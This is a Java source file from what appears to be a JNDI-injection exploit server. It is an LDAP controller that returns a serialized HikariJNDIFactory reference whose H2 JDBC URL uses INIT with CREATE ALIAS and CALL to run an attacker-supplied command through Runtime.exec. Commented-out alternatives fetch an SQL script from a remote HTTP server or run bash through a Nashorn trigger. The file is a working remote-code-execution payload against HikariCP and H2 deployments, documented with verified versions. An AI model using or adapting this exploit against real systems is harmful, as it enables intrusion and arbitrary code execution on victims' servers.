package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * RCE by controlling the JDBC URL (connection string) of HikariJNDIFactory.
 * HikariJNDIFactory provides an implementation of javax.naming.ObjectFactory that can be used to instantiate a data source
 * and the connection string is controllable via the jdbcUrl attribute.
 * The JDBC connection string for an H2 database includes an INIT parameter, allowing the execution of an SQL statement.
 * Utilizing the CREATE ALIAS command, one can establish a function that embeds a Java payload, which can then be invoked within an SQL query.
 * Therefore, by configuring a JDBC connection string for an H2 database to include an INIT parameter that directs to an
 * SQL statement featuring the CREATE ALIAS command followed by a CALL command, arbitrary Java code can be executed.

 * Requires:
 *  HikariCP and H2 in classpath

 *  Verified On:
 *  - com.zaxxer:HikariCP:4.0.3
 *  - com.h2database:h2:2.1.214
 *
 * @author snowyowl
 */

@LdapMapping(uri = {"/o=hikaricp-h2"})
public class HikariCPH2 implements LdapController {


    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with hikaricp-h2-sql payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        // This payload for H2 db that can be used to fetch an SQL file from an external HTTP server
        // specified via the --command user input.
        // String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"+ Config.command +"'";

        // This is a payload for H2 DB that makes use of JavaScript to trigger command execution
        // Since Nashorn was removed in Java 15 this payload is limited to targets using JDK version < 15
        /*
        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(['bash', '-c', '"+ Config.command + "'])";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;" +
                "init=CREATE TRIGGER cmdExec BEFORE SELECT ON INFORMATION_SCHEMA.USERS AS $$" +
                javascript + " $$";
        */

        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS IF NOT EXISTS EXEC AS " +
                "'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;" +
                "return \"test\"\\;}'\\;CALL EXEC('" + Config.command + "')";

        // payload for MSSql server  - yet to be developed into a working exploit.
        // String url = "jdbc:sqlserver://localhost:1533;connectRetryCount=0;encrypt=false;database=testdb;integratedSecurity=false;socketFactoryClass=com.snowyowl.commonsbeanutils1.jdbc.mssql.DummySocketFactory;socketFactoryConstructorArg=http://127.0.0.1:7800/bean.xml";

        Reference ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
        // ref.add(new StringRefAddr("driverClassName", "com.microsoft.sqlserver.jdbc.SQLServerDriver"));
        // ref.add(new StringRefAddr("driverClassName", "org.postgresql.Driver"));
        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("jdbcUrl", url));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));

        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
